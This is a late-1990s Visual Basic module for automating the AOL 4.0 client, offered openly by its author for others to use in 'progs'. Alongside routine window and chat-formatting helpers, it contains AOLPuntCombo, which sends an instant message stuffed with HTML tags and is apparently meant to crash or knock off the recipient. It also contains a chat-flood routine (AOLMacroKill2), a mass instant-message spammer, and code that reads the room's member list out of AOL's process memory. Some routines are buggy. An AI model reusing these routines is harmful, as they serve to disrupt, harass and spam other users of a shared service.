Attribute VB_Name = "MaceXv³"
'MaceXv³ my 3rd bas
'Made For VB4 and Mainly AOL4.0
'But has some AIM and AOL3.0 and 2.5 options
'Have any probs
' Email me @ MaceX2000@juno.com
' or visit my site at Http://www.macex.org
'Greetz Goes out to all my Fellow UqG Members
'GenozideX  Oreo69 NcR NRE KornX Warp
'Gestapo and anyone i forgot

Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, source As Any, ByVal Length As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Declare Function SetWindowLong& Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long)
Declare Function Shell_NotifyIcon Lib "shell32.dll" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, lpData As NOTIFYICONDATA)
Declare Function GetKeyState% Lib "user32" (ByVal nVirtKey As Long)
Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Declare Function GetWindowWord Lib "user32" (ByVal hwnd As Long, ByVal nIndex As Long) As Integer
Declare Function GetParent Lib "user32" (ByVal hwnd As Integer) As Integer
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd&, ByVal lpClassName$, ByVal nMaxCount&)
Declare Function GetWindowText& Lib "user32" Alias "GetWindowTextA" (ByVal hwnd&, ByVal lpString$, ByVal cch&)
Declare Function GetActiveWindow% Lib "user32" ()
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetPixelV Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Declare Function SetPixelFormat Lib "gdi32" (ByVal hDC As Long, ByVal n As Long, pcPixelFormatDescriptor As PIXELFORMATDESCRIPTOR) As Long
Declare Function SetPixel Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function Rectangle Lib "gdi32" (ByVal hDC As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function GetPixel Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long) As Long
Declare Function GetPixelFormat Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function gettopwindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Long) As Long
Declare Function SetFocusApi Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function GetWindowTextB Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Declare Function StretchBlt Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Declare Function StretchDIBits Lib "gdi32" (ByVal hDC As Long, ByVal X As Long, ByVal Y As Long, ByVal dx As Long, ByVal dy As Long, ByVal SrcX As Long, ByVal SrcY As Long, ByVal wSrcWidth As Long, ByVal wSrcHeight As Long, lpBits As Any, lpBitsInfo As BITMAPINFO, ByVal wUsage As Long, ByVal dwRop As Long) As Long
Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconA" (ByVal hInst As Long, ByVal lpszExeFileName As String, ByVal nIconIndex As Long) As Long
Declare Function CopyIcon Lib "user32" (ByVal hIcon As Long)
Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long
Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, lpInitData As DEVMODE) As Long
Declare Function SelectObject Lib "gdi32" (ByVal hDC As Long, ByVal hObject As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hDC As Long) As Long
Declare Function DeleteDC Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function ScreenToClient Lib "user32" (ByVal hwnd As Long, lpPoint As POINTAPI) As Long
Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateEllipticRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateRectRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long

Public Const CCHDEVICENAME = 32
Public Const CCHFORMNAME = 32

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Const GWW_HINSTANCE = (-6)
Const GWW_ID = (-12)
Const GWL_STYLE = (-16)
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Const SW_MINIMIZE = 6



Const SPI_SCREENSAVERRUNNING = 97

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230


Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const WM_SYSCOMMAND = &H112
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&


Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HFFFFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000

Public Type RGBQUAD
        rgbBlue As Byte
        rgbGreen As Byte
        rgbRed As Byte
        rgbReserved As Byte
End Type

Type NOTIFYICONDATA
        cbSize As Long
        hwnd As Long
        uID As Long
        uFlags As Long
        uCallbackMessage As Long
        hIcon As Long
        szTip As String * 64
End Type

Type DEVMODE
        dmDeviceName As String * CCHDEVICENAME
        dmSpecVersion As Integer
        dmDriverVersion As Integer
        dmSize As Integer
        dmDriverExtra As Integer
        dmFields As Long
        dmOrientation As Integer
        dmPaperSize As Integer
        dmPaperLength As Integer
        dmPaperWidth As Integer
        dmScale As Integer
        dmCopies As Integer
        dmDefaultSource As Integer
        dmPrintQuality As Integer
        dmColor As Integer
        dmDuplex As Integer
        dmYResolution As Integer
        dmTTOption As Integer
        dmCollate As Integer
        dmFormName As String * CCHFORMNAME
        dmUnusedPadding As Integer
        dmBitsPerPel As Integer
        dmPelsWidth As Long
        dmPelsHeight As Long
        dmDisplayFlags As Long
        dmDisplayFrequency As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
 End Type

Type BITMAPINFOHEADER
        biSize As Long
        biWidth As Long
        biHeight As Long
        biPlanes As Integer
        biBitCount As Integer
        biCompression As Long
        biSizeImage As Long
        biXPelsPerMeter As Long
        biYPelsPerMeter As Long
        biClrUsed As Long
        biClrImportant As Long
End Type

Type BITMAPINFO
        bmiHeader As BITMAPINFOHEADER
        bmiColors As RGBQUAD
End Type


Public Type BITMAP '14 bytes
        bmType As Long
        bmWidth As Long
        bmHeight As Long
        bmWidthBytes As Long
        bmPlanes As Integer
        bmBitsPixel As Integer
        bmBits As Long
End Type
Public Type BITMAPCOREHEADER '12 bytes
        bcSize As Long
        bcWidth As Integer
        bcHeight As Integer
        bcPlanes As Integer
        bcBitCount As Integer
End Type

Type RGBTRIPLE
        rgbtBlue As Byte
        rgbtGreen As Byte
        rgbtRed As Byte
End Type

Type BITMAPCOREINFO
        bmciHeader As BITMAPCOREHEADER
        bmciColors As RGBTRIPLE
End Type
Public Type BITMAPFILEHEADER
        bfType As Integer
        bfSize As Long
        bfReserved1 As Integer
        bfReserved2 As Integer
        bfOffBits As Long
End Type

Public Type BITMAPV4HEADER
        bV4Size As Long
        bV4Width As Long
        bV4Height As Long
        bV4Planes As Integer
        bV4BitCount As Integer
        bV4V4Compression As Long
        bV4SizeImage As Long
        bV4XPelsPerMeter As Long
        bV4YPelsPerMeter As Long
        bV4ClrUsed As Long
        bV4ClrImportant As Long
        bV4RedMask As Long
        bV4GreenMask As Long
        bV4BlueMask As Long
        bV4AlphaMask As Long
        bV4CSType As Long
        bV4Endpoints As Long
        bV4GammaRed As Long
        bV4GammaGreen As Long
        bV4GammaBlue As Long
End Type

Type COLORRGB
  red As Long
  green As Long
  blue As Long
End Type

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Public Type PIXELFORMATDESCRIPTOR
    nSize As Integer
    nVersion As Integer
    dwFlags As Long
    iPixelType As Byte
    cColorBits As Byte
    cRedBits As Byte
    cRedShift As Byte
    cGreenBits As Byte
    cGreenShift As Byte
    cBlueBits As Byte
    cBlueShift As Byte
    cAlphaBits As Byte
    cAlphaShift As Byte
    cAccumBits As Byte
    cAccumRedBits As Byte
    cAccumGreenBits As Byte
    cAccumBlueBits As Byte
    cAccumAlphaBits As Byte
    cDepthBits As Byte
    cStencilBits As Byte
    cAuxBuffers As Byte
    iLayerType As Byte
    bReserved As Byte
    dwLayerMask As Long
    dwVisibleMask As Long
    dwDamageMask As Long
End Type


Dim nXCoord(50) As Integer
Dim nYCoord(50) As Integer
Dim nXSpeed(50) As Integer
Dim nYSpeed(50) As Integer

Function BoldBlack_LBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (msg)
End Function


Sub CatWatch()
Do
DoEvents
BoldBlueBlack "(¯`·¸ • Cat Watch On • ¸·´¯)"
Call AOL4CatWatch
Call AOLGuideWatch

TimeOut 60
Loop
End Sub
Sub CatWatchStop()
BoldBlueBlack "(¯`·¸ • Catwatch Off • ¸·´¯)"
Do: DoEvents: Loop
End Sub
Sub AOL4LoLRoom()
'used for a sup bot
If IsUserOnline = 0 Then GoTo last
FindChatRoom
If FindChatRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call SendChat("HeY! " & Person$ & " LoL")
TimeOut (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Sub


Public Sub SendMassIM(List, txt As String)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call AOL4_IM(List.text, txt + "     <FONT COLOR=#F2000E>B<FONT COLOR=#E4001C>l<FONT COLOR=#D5002B>i<FONT COLOR=#C70039>z<FONT COLOR=#B90047>z<FONT COLOR=#AB0055>a<FONT COLOR=#9C0064>r<FONT COLOR=#8E0072>d<FONT COLOR=#800080> <FONT COLOR=#72008E>M<FONT COLOR=#64009C>a<FONT COLOR=#5500AB>s<FONT COLOR=#4700B9>s<FONT COLOR=#3900C7>I<FONT COLOR=#2B00D5>M<FONT COLOR=#1C00E4>e<FONT COLOR=#0E00F2>r<FONT COLOR=#000000>")
TimeOut 1.5
Next MassIM1
List.Enabled = True

End Sub

Sub KillWait()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AoIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AoIcon% = GetWindow(AoIcon%, 2)
Next GetIcon

Call TimeOut(0.05)
ClickIcon (AoIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = Findchildbytitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub

Function r_backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = Text3
Let lenth% = Len(Text3)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(Text3, numspc%, 1)
Let newsent$ = NextChr$ & newsent$
Loop
Text2.AddItem newsent$

End Function





Sub SpiralChat(text As String)
'example AOL
'aol
'ola
'lao
'aol
For B = 1 To Len(text)
H$ = Mid(text, B, Len(text)) & Mid(text, 1, B - 1)
SendChat "<font face=""Times"">•–{ <font color=#0000FF><b>" & H$ & "</b><font color=#000000> }–•"
Pause 0.5
Next
Pause 0.5
SendChat "<font face=""Times"">•–{ <font color=#0000FF><b>" & text & "</b><font color=#000000> }–•"
End Sub


Sub SpiralScroll(txt As TextBox)
X = txt.text
rider:
Dim MYLEN As Integer
MyString = txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
txt.text = MYSTR
SendChat "•[" + X + "]•"
If txt.text = X Then
Exit Sub
End If
GoTo rider
End Sub

Sub ClearChat()
childs% = FindRoom()
child = FindChildByClass(childs%, "RICHCNTL")
GetTrim = SendMessageByNum(child, 13, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 12, GetTrim + 1, TrimSpace$)
theview$ = TrimSpace$
End Sub
Function ChatSendBox()
Room% = FindRoom()
aR1% = FindChildByClass(Room%, "RICHCNTL")
aR2% = GetWindow(aR1%, 2)
aR3% = GetWindow(aR2%, 2)
aR4% = GetWindow(aR3%, 2)
aR5% = GetWindow(aR4%, 2)
aR6% = GetWindow(aR5%, 2)
ar7% = GetWindow(aR6%, 2)
ChatSendBox = ar7%
End Function

Public Sub MIDIStop(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub

Public Sub Toolbar(Number As Integer)
'clicks a button on the toolbar
'1 - Read Mail
'2 - Send Mail
'3 - Mail Center
'4 - Print
'6 - My Files
'7 - My AOL
'8 - Favorites
'10 - Internet
'11 - Channels
'12 - People
'13 - Back
'14 - Forward
'15 - Stop
'16 - Reload
'17 - Home
'18 - Find
'19 - Go
'20 - Keyword
AOL% = FindWindow("AOL Frame25", vbNullString)
TB1% = FindChildByClass(AOL%, "AOL Toolbar")
tc% = FindChildByClass(TB1%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")

If Number = 1 Then
    Call ClickIcon(td%)
    Exit Sub
End If

For T = 0 To Number - 2
td% = GetWindow(td%, 2)
Next T

Call ClickIcon(td%)

End Sub


Function WhitePurpleWhite(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
    WhitePurpleWhite = msg
End Function


Sub AOL4_IM(Person, message)


Call KeyWord("aol://9293:" & Person)
TimeOut (2)
Do
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IM% = Findchildbytitle(MDI%, "Send Instant Message")
aolrich% = FindChildByClass(IM%, "RICHCNTL")
IMsend2% = FindChildByClass(IM%, "_AOL_Icon")
Loop Until (IM% <> 0 And aolrich% <> 0 And IMsend2% <> 0)
Call SendMessageByString(aolrich%, WM_SETTEXT, 0, message)
For sends = 1 To 9
IMsend2% = GetWindow(IMsend2%, GW_HWNDNEXT)
Next sends
AOLIcon IMsend2%
If IM% Then Call AOLKillWindow(IM%)
End Sub
Public Sub IMsOff()
Call AOL4_IM("$IM_OFF", "MaCE X Ownz U ")
End Sub
Public Sub IMsOn()
Call AOL4_IM("$IM_ON", "MaCE X Ownz U ")
End Sub

Public Sub AOLKillWindow(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Sub AOLlocateMember(SN)
'This will locate a member online. duh
Call KeyWord("aol://3548:" & SN)
End Sub


Function AOLMacroKill2()
BoldSendChat "<FONT  COLOR=""#fffeff"" SIZE=3 PTSIZE=10>@@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ <BR>{S Goodbye"
End Function

Sub AOLMainMenu()
Call RunMenu(2, 3)
End Sub

Public Sub AOLPuntCombo(Person$)
Call AOL4_IM(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
End Sub

Function AOLRoomCount()

Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function

Public Function AOLRoomFull()
'Add this to your room bust and it will close the
'message box that is telling you the room is full
Do
Pause 0.00002
msg1% = FindWindow("#32770", "America Online")
Button2% = FindChildByClass(msg1%, "Button")
Stat% = FindChildByClass(msg1%, "Static")
statcap% = Findchildbytitle(msg1%, "The room you requested is full.")

If Stat% <> 0 And Button2% <> 0 And statcap% <> 0 Then Call ClickIcon(Button2%)
